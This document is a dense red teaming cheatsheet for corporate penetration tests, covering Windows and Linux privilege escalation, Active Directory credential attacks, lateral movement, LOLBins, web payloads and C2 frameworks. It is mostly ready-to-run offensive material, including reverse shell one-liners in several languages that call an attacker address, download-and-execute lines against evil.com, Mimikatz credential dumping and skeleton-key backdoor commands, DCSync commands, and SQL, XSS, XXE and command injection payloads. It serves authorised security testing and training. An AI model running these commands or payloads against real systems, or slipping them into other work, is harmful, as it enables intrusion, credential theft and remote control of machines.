# 🔴 Red Teaming / Penetration Testing — Cheatsheet
> Night-before reference · Dense quick-lookup · Corporate engagement ready

---

## 🗺️ PENTEST PHASES QUICK REFERENCE

```
┌─────────────────────────────────────────────────────────────────────────┐
│  1. PRE-ENGAGEMENT    2. RECON      3. SCAN/ENUM   4. EXPLOITATION      │
│  ─────────────────   ─────────     ───────────    ───────────────       │
│  Scope agreement      Passive OSINT  Nmap scans     Exploit vulns        │
│  RoE signed           Shodan/Censys  Enum services  Web attacks          │
│  Legal docs ready     DNS/subdomain  AD enum        AD attacks           │
│  Emergency contacts   Google dorks   BloodHound     Credential attack    │
│                       LinkedIn       Vuln scan      C2 establish         │
│                                                                           │
│  5. POST-EXPLOIT      6. LATERAL    7. EXFIL       8. REPORTING         │
│  ─────────────────    ──────────    ─────────       ─────────────        │
│  Priv esc             PtH / PtT     Data staging   Exec summary          │
│  Persist (if scope)   PSExec/WMI    Exfil channels  CVSS ratings         │
│  Dump creds           SSH tunnels   Cleanup        MITRE mapping         │
│  Screenshot evidence  RDP/VNC       IOC removal    Remediation steps     │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 🔍 NMAP QUICK REFERENCE

```bash
# Host Discovery
nmap -sn 192.168.1.0/24                   # Ping sweep
nmap -sn -PR 192.168.1.0/24              # ARP scan (local net)

# Port Scanning
nmap -p- 192.168.1.10                     # All 65535 ports
nmap -p 22,80,443,445,3389 192.168.1.10  # Specific ports
nmap -p 1-1000 192.168.1.10              # Port range
nmap --top-ports 1000 192.168.1.10       # Top 1000 ports

# Service & Version Detection
nmap -sV 192.168.1.10                    # Service versions
nmap -sC 192.168.1.10                    # Default scripts
nmap -A 192.168.1.10                     # Aggressive (OS, version, scripts)
nmap -O 192.168.1.10                     # OS detection

# Scan Types
nmap -sT 192.168.1.10                    # TCP Connect (noisy)
nmap -sS 192.168.1.10                    # SYN scan (stealth, default)
nmap -sU 192.168.1.10                    # UDP scan (slow)
nmap -sN 192.168.1.10                    # Null scan (FIN=0,SYN=0,RST=0)
nmap -sF 192.168.1.10                    # FIN scan
nmap -sX 192.168.1.10                    # Xmas scan

# OPSEC / Speed
nmap -T1 192.168.1.10                    # Slowest (avoid detection)
nmap -T4 192.168.1.10                    # Fast (normal pentest)
nmap --max-retries 1 --min-rate 300      # Tuned speed

# Output
nmap -oN output.txt 192.168.1.10         # Normal output
nmap -oX output.xml 192.168.1.10         # XML
nmap -oG output.gnmap 192.168.1.10      # Grepable
nmap -oA output 192.168.1.10            # All formats

# Useful Scripts
nmap --script smb-vuln* 192.168.1.10    # SMB vulnerabilities
nmap --script vuln 192.168.1.10         # All vuln scripts
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=corp.local 192.168.1.10
```

---

## 🪟 WINDOWS PRIVILEGE ESCALATION CHECKLIST

```powershell
# ═══ SYSTEM INFO ═══
systeminfo | findstr /B /C:"OS" /C:"Hotfix" /C:"System Type"
whoami /priv              # Check token privileges
whoami /groups            # Group memberships
net user %username% /domain

# ═══ HIGH-VALUE PRIVILEGES ═══
# SeImpersonatePrivilege  → Potato attacks (PrintSpoofer, GodPotato)
# SeDebugPrivilege        → Dump LSASS
# SeBackupPrivilege       → Read any file (SAM, SYSTEM, NTDS.dit)
# SeRestorePrivilege      → Write any file
# SeTakeOwnershipPrivilege → Own any object
# SeLoadDriverPrivilege   → Load malicious driver

# ═══ SERVICES ═══
sc qc ServiceName                        # Service config
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" *
# Unquoted service paths:
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# ═══ SCHEDULED TASKS ═══
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run" /C:"Run As User"
icacls C:\path\to\task\binary.exe        # Check if writable

# ═══ REGISTRY ═══
# AlwaysInstallElevated:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# → Both must be 1 → msiexec /quiet /i malicious.msi

# Autorun paths:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# ═══ STORED CREDENTIALS ═══
cmdkey /list                             # Cached credentials
dir /s /b *pass* *cred* *vnc* *.config* 2>nul
findstr /si password *.txt *.xml *.ini *.config 2>nul
reg query HKLM /f password /t REG_SZ /s

# ═══ DLL HIJACKING ═══
# 1. Process Monitor → filter: Result=NAME NOT FOUND + Path ends in .dll
# 2. Check if search path is writable: echo %PATH%
# 3. Drop malicious DLL in writable directory

# ═══ POTATO ATTACKS (SeImpersonatePrivilege) ═══
PrintSpoofer.exe -i -c cmd              # Windows Server 2016/2019
GodPotato.exe -cmd "cmd /c whoami"     # Universal
JuicyPotatoNG.exe -t * -p cmd.exe

# ═══ AUTOMATED ═══
winPEAS.exe                             # Comprehensive enum
PowerUp.ps1 → Invoke-AllChecks         # PowerShell priv esc
Seatbelt.exe -group=system             # Security configuration audit
```

---

## 🐧 LINUX PRIVILEGE ESCALATION CHECKLIST

```bash
# ═══ INITIAL RECON ═══
whoami; id; hostname; uname -a
cat /etc/passwd | grep -v nologin      # Users with shells
cat /etc/crontab; ls -la /etc/cron*   # Cron jobs
env                                     # Environment variables
echo $PATH                             # PATH hijacking potential

# ═══ SUID / SGID BINARIES ═══
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID
# → Check GTFOBins.github.io for exploitation

# Common exploitable SUIDs:
# /usr/bin/find → find . -exec /bin/bash \; -quit
# /usr/bin/vim  → :!/bin/bash
# /usr/bin/less → !/bin/bash
# /usr/bin/nmap → (old) --interactive → !sh

# ═══ SUDO MISCONFIG ═══
sudo -l                                 # What can current user sudo?
# Common misconfigs:
# (root) NOPASSWD: /usr/bin/find → sudo find . -exec /bin/bash \; -quit
# (root) NOPASSWD: /bin/nano    → sudo nano → ^R^X → reset; sh 1>&0 2>&0

# ═══ CAPABILITIES ═══
getcap -r / 2>/dev/null
# cap_setuid+ep on python3 → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_net_raw+ep → tcpdump → sniff credentials

# ═══ WRITABLE FILES / CRON ABUSE ═══
find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys
# → If cron script is writable and runs as root → inject command

# ═══ PATH HIJACKING ═══
echo $PATH
# If /tmp or writable dir comes before /usr/bin:
echo "/bin/bash" > /tmp/ls; chmod +x /tmp/ls; export PATH=/tmp:$PATH
# → Next time root runs 'ls' → shell

# ═══ NFS NO_ROOT_SQUASH ═══
showmount -e <target>                   # Show mounts
# no_root_squash → mount on attacker, create SUID binary as root, execute on target

# ═══ KERNEL EXPLOITS ═══
uname -r                               # Kernel version
# Notable:
# CVE-2022-0847 DirtyPipe    → kernel 5.8-5.16 → write to any file
# CVE-2021-4034 PwnKit       → pkexec privesc → works on all major distros
# CVE-2021-3493 OverlayFS    → Ubuntu < 20.10
# CVE-2016-5195 DirtyCow     → kernel < 4.8.3

# ═══ AUTOMATED ═══
./linpeas.sh 2>/dev/null | tee linpeas_out.txt
./lse.sh -l 1                          # Linux Smart Enumeration
python3 /tmp/linEnum.sh
```

---

## ⚔️ IMPACKET KEY COMMANDS

```bash
# ═══ CREDENTIAL DUMPING ═══
secretsdump.py -just-dc CORP/admin:password@192.168.1.10      # DCSync all hashes
secretsdump.py -just-dc-user krbtgt CORP/admin:pass@192.168.1.10  # Specific user
secretsdump.py -hashes :NTLMhash CORP/admin@192.168.1.10     # PtH
secretsdump.py CORP/admin:pass@192.168.1.10                   # SAM + LSA + cached

# ═══ KERBEROASTING ═══
GetUserSPNs.py -request -dc-ip 192.168.1.10 CORP/user:pass   # Get TGS hashes
GetUserSPNs.py -request -dc-ip 192.168.1.10 -hashes :hash CORP/user  # PtH

# ═══ AS-REP ROASTING ═══
GetNPUsers.py -dc-ip 192.168.1.10 CORP/ -usersfile users.txt -format hashcat
GetNPUsers.py -dc-ip 192.168.1.10 CORP/user:pass -request

# ═══ REMOTE EXECUTION ═══
psexec.py CORP/admin:pass@192.168.1.10           # SMB exec (creates service)
wmiexec.py CORP/admin:pass@192.168.1.10          # WMI exec (semi-interactive)
smbexec.py CORP/admin:pass@192.168.1.10          # SMB exec (noisier)
atexec.py CORP/admin:pass@192.168.1.10 whoami    # Task scheduler exec
dcomexec.py CORP/admin:pass@192.168.1.10         # DCOM exec

# With hashes:
psexec.py -hashes :NTLMhash CORP/admin@192.168.1.10

# ═══ NTLM RELAY ═══
ntlmrelayx.py -tf targets.txt -smb2support               # Basic relay
ntlmrelayx.py -tf targets.txt -smb2support -i            # Interactive shell
ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -socks  # SOCKS

# ═══ TICKET OPERATIONS ═══
getTGT.py -dc-ip 192.168.1.10 CORP/user:pass             # Get TGT
getST.py -spn cifs/server01 -impersonate admin CORP/svc:pass  # S4U2proxy

# ═══ MISC ═══
lookupsid.py CORP/user:pass@192.168.1.10                  # Enumerate SIDs
samrdump.py CORP/user:pass@192.168.1.10                   # Enumerate users
rpcdump.py @192.168.1.10                                   # RPC endpoint enum
```

---

## 🎭 MIMIKATZ KEY COMMANDS

```powershell
# ═══ PRIVILEGES ═══
privilege::debug              # Enable debug rights (needed for most commands)
token::elevate                # Elevate to SYSTEM token

# ═══ CREDENTIAL DUMPING ═══
sekurlsa::logonpasswords      # Dump all credentials from LSASS
sekurlsa::wdigest             # WDigest plaintext passwords (older systems)
sekurlsa::msv                 # MSV credentials (NTLM hashes)
sekurlsa::tspkg               # TSPkg credentials
sekurlsa::kerberos            # Kerberos credentials

# ═══ TICKET OPERATIONS ═══
sekurlsa::tickets             # List Kerberos tickets in memory
sekurlsa::tickets /export     # Export all tickets to .kirbi files
kerberos::list                # List tickets
kerberos::list /export        # Export tickets
kerberos::ptt ticket.kirbi    # Inject ticket (Pass-the-Ticket)
kerberos::purge               # Clear all tickets

# ═══ GOLDEN / SILVER TICKET ═══
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:<hash> /id:500
kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /target:server01.corp.local /service:cifs /rc4:<service_hash>

# ═══ PASS-THE-HASH ═══
sekurlsa::pth /user:admin /domain:corp.local /ntlm:<hash> /run:cmd.exe

# ═══ DCSYNC ═══
lsadump::dcsync /domain:corp.local /all /csv
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /user:Administrator

# ═══ SAM / LSA ═══
lsadump::sam                  # Local SAM database
lsadump::secrets              # LSA secrets
lsadump::cache                # Cached domain credentials (DCC2)

# ═══ MISC ═══
misc::skeleton                # Skeleton key backdoor (every account → password: mimikatz)
vault::cred                   # Windows credential vault
vault::list                   # List vault items
```

---

## 🩸 BLOODHOUND KEY CYPHER QUERIES

```cypher
-- Find all Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.name =~ "(?i)domain admins.*" RETURN u.name

-- Shortest path to Domain Admin
MATCH p=shortestPath((n:User {name:"COMPROMISED@CORP.LOCAL"})-[*1..]->(m:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

-- Find computers where domain users are local admin
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group)-[:AdminTo]->(c:Computer) RETURN p

-- Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

-- AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

-- Unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

-- DCSync rights
MATCH p=(u)-[:DCSync|GenericAll|AllExtendedRights]->(d:Domain) RETURN p

-- GenericAll / WriteDACL on DA group
MATCH p=(n)-[:GenericAll]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN p

-- Find paths from owned nodes (mark nodes as owned first)
MATCH p=shortestPath((u:User {owned:true})-[*1..10]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

-- Users with local admin on high-value targets
MATCH (u:User)-[:AdminTo]->(c:Computer {highvalue:true}) RETURN u.name, c.name
```

---

## 🔄 LATERAL MOVEMENT COMMANDS

```powershell
# ═══ PSExec (creates service — noisy) ═══
psexec.exe \\192.168.1.10 -u admin -p pass cmd.exe
Invoke-Command -ComputerName 192.168.1.10 -ScriptBlock {whoami}

# ═══ WMI (quieter) ═══
wmic /node:192.168.1.10 /user:CORP\admin /password:pass process call create "cmd.exe /c whoami > C:\out.txt"
Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName 192.168.1.10

# ═══ WinRM / PowerShell Remoting ═══
Enter-PSSession -ComputerName 192.168.1.10 -Credential CORP\admin
New-PSSession 192.168.1.10

# ═══ RDP ═══
xfreerdp /v:192.168.1.10 /u:admin /p:pass        # Linux client
mstsc /v:192.168.1.10                              # Windows

# ═══ SMB ═══
net use \\192.168.1.10\C$ password /user:admin     # Map drive
copy malware.exe \\192.168.1.10\C$\Windows\Temp\

# ═══ DCOM ═══
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")

# ═══ SSH TUNNELING ═══
ssh -D 1080 user@pivot-host                        # SOCKS proxy
ssh -L 3389:internal-host:3389 user@pivot-host    # Port forward
proxychains nmap -sT -Pn 10.10.10.0/24            # Pivot through SOCKS

# ═══ CRACKMAPEXEC LATERAL ═══
crackmapexec smb 192.168.1.0/24 -u admin -p pass --exec-method smbexec -x whoami
crackmapexec smb 192.168.1.0/24 -u admin -H NTLMhash  # Pass-the-Hash
crackmapexec winrm 192.168.1.10 -u admin -p pass -x whoami
```

---

## 🐚 REVERSE SHELL ONE-LINERS

```bash
# ═══ LISTENER ═══
nc -lvnp 4444
rlwrap nc -lvnp 4444      # With readline (better shell)

# ═══ BASH ═══
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

# ═══ PYTHON ═══
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# ═══ NETCAT ═══
nc -e /bin/sh 10.10.10.10 4444        # If -e is supported
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f

# ═══ POWERSHELL ═══
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# ═══ PERL ═══
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# ═══ RUBY ═══
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# ═══ PHP ═══
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# ═══ SHELL UPGRADE (TTY) ═══
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

---

## 🏛️ ACTIVE DIRECTORY ATTACK QUICK REFERENCE

```
┌──────────────────────────────────────────────────────────────────────┐
│                    AD ATTACK MATRIX                                   │
├─────────────────┬───────────────────────────┬───────────────────────┤
│ Attack          │ Requirement               │ Hashcat Mode          │
├─────────────────┼───────────────────────────┼───────────────────────┤
│ Kerberoasting   │ Valid domain user         │ -m 13100              │
│ AS-REP Roast    │ No auth (if no pre-auth)  │ -m 18200              │
│ Pass-the-Hash   │ NTLM hash                 │ N/A (use in tools)    │
│ Pass-the-Ticket │ Valid TGT/TGS (.kirbi)    │ N/A (inject in mem)   │
│ DCSync          │ Replication rights        │ N/A                   │
│ Golden Ticket   │ KRBTGT hash + domain SID  │ N/A                   │
│ Silver Ticket   │ Service account hash      │ N/A                   │
│ LLMNR Poison    │ Network position          │ -m 5600 (NTLMv2)      │
│ NTLM Relay      │ SMB signing disabled      │ N/A                   │
│ ACL Abuse       │ GenericAll/WriteDACL      │ N/A                   │
│ Unconstrained   │ Admin access to deleg. host│ N/A                  │
│ Delegation      │                           │                       │
└─────────────────┴───────────────────────────┴───────────────────────┘

Hashcat word lists:
  rockyou.txt        → General cracking
  weakpass_3.txt     → Corporate passwords
  Custom rules:      → hashcat -r best64.rule -a 0 hashes.txt wordlist.txt
```

---

## 🌐 WEB APPLICATION ATTACK QUICK REFERENCE

```
┌──────────────────────────────────────────────────────────────────────┐
│ VULNERABILITY    │ TEST PAYLOAD               │ TOOL                │
├──────────────────┼────────────────────────────┼─────────────────────┤
│ SQLi             │ ' OR '1'='1                │ sqlmap              │
│                  │ ' UNION SELECT NULL--       │                     │
│                  │ 1; SLEEP(5)--               │                     │
├──────────────────┼────────────────────────────┼─────────────────────┤
│ XSS Reflected    │ <script>alert(1)</script>  │ Burp Suite          │
│ XSS Stored       │ <img src=x onerror=alert(1)│ Burp Collaborator   │
│ XSS DOM          │ javascript:alert(1)        │                     │
├──────────────────┼────────────────────────────┼─────────────────────┤
│ SSRF             │ http://127.0.0.1:PORT      │ Burp Collaborator   │
│                  │ http://169.254.169.254/    │                     │
├──────────────────┼────────────────────────────┼─────────────────────┤
│ SSTI             │ {{7*7}}                    │ Manual / tplmap     │
│                  │ ${7*7}                     │                     │
│                  │ <%= 7*7 %>                 │                     │
├──────────────────┼────────────────────────────┼─────────────────────┤
│ LFI              │ ../../../etc/passwd        │ ffuf, Burp          │
│                  │ ....//....//etc/passwd     │                     │
│                  │ /proc/self/environ         │                     │
├──────────────────┼────────────────────────────┼─────────────────────┤
│ XXE              │ <!ENTITY x SYSTEM "file:///etc/passwd">          │
├──────────────────┼────────────────────────────┼─────────────────────┤
│ IDOR             │ Change id=1001 to id=1002  │ Burp Intruder       │
│                  │ Change user_id in JWT      │                     │
├──────────────────┼────────────────────────────┼─────────────────────┤
│ CSRF             │ Auto-submit cross-origin form with img/script    │
├──────────────────┼────────────────────────────┼─────────────────────┤
│ Command Inj      │ ;id  |id  `id`             │ Manual              │
│                  │ $(id) &&id                 │                     │
└──────────────────┴────────────────────────────┴─────────────────────┘
```

---

## 🪝 LOLBins (Living-off-the-Land Binaries) REFERENCE

```
┌────────────────┬────────────────────────────────────────────────────┐
│ Binary         │ Abuse Technique                                     │
├────────────────┼────────────────────────────────────────────────────┤
│ certutil.exe   │ Download: certutil -urlcache -split -f http://x/f  │
│                │ Base64 decode: certutil -decode enc.b64 out.exe     │
├────────────────┼────────────────────────────────────────────────────┤
│ bitsadmin.exe  │ bitsadmin /transfer job http://x/f C:\out.exe      │
├────────────────┼────────────────────────────────────────────────────┤
│ mshta.exe      │ mshta http://evil.com/payload.hta                  │
│                │ mshta vbscript:Execute("CreateObject(...)")         │
├────────────────┼────────────────────────────────────────────────────┤
│ regsvr32.exe   │ regsvr32 /s /n /u /i:http://x/file.sct scrobj.dll │
│                │ (Squiblydoo — COM scriptlet bypass)                │
├────────────────┼────────────────────────────────────────────────────┤
│ rundll32.exe   │ rundll32 javascript:"\..\mshtml,RunHTMLApplication"│
│                │ rundll32 shell32.dll,ShellExec_RunDLL cmd.exe      │
├────────────────┼────────────────────────────────────────────────────┤
│ wmic.exe       │ wmic process call create "cmd.exe /c whoami"       │
├────────────────┼────────────────────────────────────────────────────┤
│ powershell.exe │ IEX (New-Object Net.WebClient).DownloadString(url) │
│                │ Invoke-Expression; Invoke-Command; Start-Process   │
├────────────────┼────────────────────────────────────────────────────┤
│ wscript.exe    │ wscript.exe payload.js / payload.vbs               │
├────────────────┼────────────────────────────────────────────────────┤
│ cscript.exe    │ cscript.exe payload.vbs                            │
├────────────────┼────────────────────────────────────────────────────┤
│ msiexec.exe    │ msiexec /q /i http://evil.com/payload.msi          │
└────────────────┴────────────────────────────────────────────────────┘
Reference: lolbas-project.github.io
```

---

## 📦 PAYLOAD TYPES & DETECTION RISK

```
┌─────────────────────────┬──────────────────┬─────────────────────────┐
│ Payload Type             │ Detection Risk   │ Use Case               │
├─────────────────────────┼──────────────────┼─────────────────────────┤
│ Raw shellcode (.bin)     │ LOW (if in-mem)  │ Injected into process  │
│ PE EXE (compiled C2)     │ HIGH             │ Noisy, many AV sigs    │
│ DLL (sideloaded)         │ MEDIUM           │ Hijack legitimate proc │
│ PowerShell script        │ MEDIUM-HIGH      │ AMSI + logging         │
│ PowerShell + reflection  │ MEDIUM           │ Bypass AMSI            │
│ HTA (HTML Application)   │ MEDIUM           │ Phishing payload       │
│ JScript/VBScript         │ MEDIUM           │ Email attachment       │
│ Office macro             │ HIGH             │ Phishing, now blocked  │
│ Excel XLSM               │ HIGH             │ Marked high risk       │
│ LNK file (shortcut)      │ MEDIUM           │ Phishing, runs cmd     │
│ ISO/IMG container        │ MEDIUM           │ Bypasses mark-of-web   │
│ Staged shellcode         │ LOW-MEDIUM       │ Small initial dropper  │
│ Stageless payload        │ MEDIUM-HIGH      │ Larger, fully featured │
│ In-memory only (fileless)│ LOW              │ Gold standard for red  │
└─────────────────────────┴──────────────────┴─────────────────────────┘
```

---

## 📡 C2 FRAMEWORK COMPARISON

```
┌───────────────┬────────────────┬──────────────┬───────────────────┐
│ Framework      │ Cost           │ Protocol     │ Notes             │
├───────────────┼────────────────┼──────────────┼───────────────────┤
│ Cobalt Strike  │ $3500/yr       │ HTTP/HTTPS   │ Industry standard │
│               │                │ DNS, SMB     │ Detected by name  │
├───────────────┼────────────────┼──────────────┼───────────────────┤
│ Havoc          │ Free (OSS)     │ HTTP/HTTPS   │ CS alternative    │
│               │                │ SMB          │ Growing adoption  │
├───────────────┼────────────────┼──────────────┼───────────────────┤
│ Sliver         │ Free (OSS)     │ HTTP/HTTPS   │ mTLS C2, DoH      │
│               │ BishopFox       │ DNS, mTLS    │ Strong OPSEC      │
├───────────────┼────────────────┼──────────────┼───────────────────┤
│ Metasploit     │ Free / Pro     │ TCP, HTTP    │ AV detected fast  │
│               │                │ HTTPS        │ Good for labs     │
├───────────────┼────────────────┼──────────────┼───────────────────┤
│ Brute Ratel    │ $2500/yr       │ HTTP/HTTPS   │ Designed for EDR  │
│               │                │              │ evasion           │
├───────────────┼────────────────┼──────────────┼───────────────────┤
│ Mythic         │ Free (OSS)     │ Varies by    │ Modular agent     │
│               │                │ agent        │ framework         │
└───────────────┴────────────────┴──────────────┴───────────────────┘
```

---

## 📊 CVSS v3.1 SEVERITY RATING

```
┌───────────────────────────────────────────────────────┐
│ CVSS Score  │ Severity   │ Action                      │
├─────────────┼────────────┼─────────────────────────────┤
│ 9.0 – 10.0  │ CRITICAL   │ Immediate fix, exec alert   │
│ 7.0 – 8.9   │ HIGH       │ Fix within 30 days          │
│ 4.0 – 6.9   │ MEDIUM     │ Fix within 90 days          │
│ 0.1 – 3.9   │ LOW        │ Fix in next release cycle   │
│ 0.0         │ NONE       │ Informational               │
└─────────────┴────────────┴─────────────────────────────┘

CVSS Vector Components:
  AV: Attack Vector (N=Network, A=Adjacent, L=Local, P=Physical)
  AC: Attack Complexity (L=Low, H=High)
  PR: Privileges Required (N=None, L=Low, H=High)
  UI: User Interaction (N=None, R=Required)
  S:  Scope (U=Unchanged, C=Changed)
  C/I/A: Confidentiality/Integrity/Availability (N=None, L=Low, H=High)

Example: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H = 10.0 (Critical)
```

---

## 🔑 KEY ACRONYMS REFERENCE

| Acronym | Full Form |
|---------|-----------|
| RCE | Remote Code Execution |
| LFI | Local File Inclusion |
| RFI | Remote File Inclusion |
| SSRF | Server-Side Request Forgery |
| IDOR | Insecure Direct Object Reference |
| CSRF | Cross-Site Request Forgery |
| XXE | XML External Entity |
| SSTI | Server-Side Template Injection |
| XSS | Cross-Site Scripting |
| SQLi | SQL Injection |
| SUID | Set User ID (Linux file permission bit) |
| SGID | Set Group ID |
| SPN | Service Principal Name |
| TGT | Ticket Granting Ticket |
| TGS | Ticket Granting Service |
| KDC | Key Distribution Center |
| DC | Domain Controller |
| NTDS | NT Directory Services (AD database) |
| SAM | Security Account Manager |
| LSA | Local Security Authority |
| LSASS | Local Security Authority Subsystem Service |
| PTH | Pass-the-Hash |
| PTT | Pass-the-Ticket |
| C2 | Command & Control |
| IOC | Indicator of Compromise |
| TTP | Tactics, Techniques & Procedures |
| LOLBin | Living-off-the-Land Binary |
| AV | Antivirus |
| EDR | Endpoint Detection & Response |
| OPSEC | Operational Security |
| OSINT | Open Source Intelligence |
| CVSS | Common Vulnerability Scoring System |
| CVE | Common Vulnerabilities and Exposures |
| CWE | Common Weakness Enumeration |
| PoC | Proof of Concept |
| RoE | Rules of Engagement |
| SOW | Statement of Work |
| APT | Advanced Persistent Threat |
| DLP | Data Loss Prevention |
| WAF | Web Application Firewall |
| VPN | Virtual Private Network |
| MFA | Multi-Factor Authentication |
| JWT | JSON Web Token |
| AMSI | Antimalware Scan Interface |
| UAC | User Account Control |
| RBAC | Role-Based Access Control |
| ACL | Access Control List |
| ACE | Access Control Entry |
| DACL | Discretionary Access Control List |
| SACL | System Access Control List |
| GPO | Group Policy Object |
| OU | Organizational Unit |
| SID | Security Identifier |
| RID | Relative Identifier |

---

## 🛠️ QUICK TOOL INSTALL REFERENCE

```bash
# Kali Linux core tools
sudo apt install nmap gobuster ffuf crackmapexec responder impacket-scripts

# Python tools
pip3 install bloodhound impacket

# SharpHound (BloodHound collector)
wget https://github.com/BloodHoundAD/SharpHound/releases/latest

# WinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest

# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest

# GTFOBins reference
https://gtfobins.github.io

# LOLBas reference
https://lolbas-project.github.io

# PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings

# HackTricks
https://book.hacktricks.xyz

# Revshell generator
https://www.revshells.com
```

---

*Red Teaming Cheatsheet · Corporate Edition · Part 4 of 4 · Keep CONFIDENTIAL during engagements*

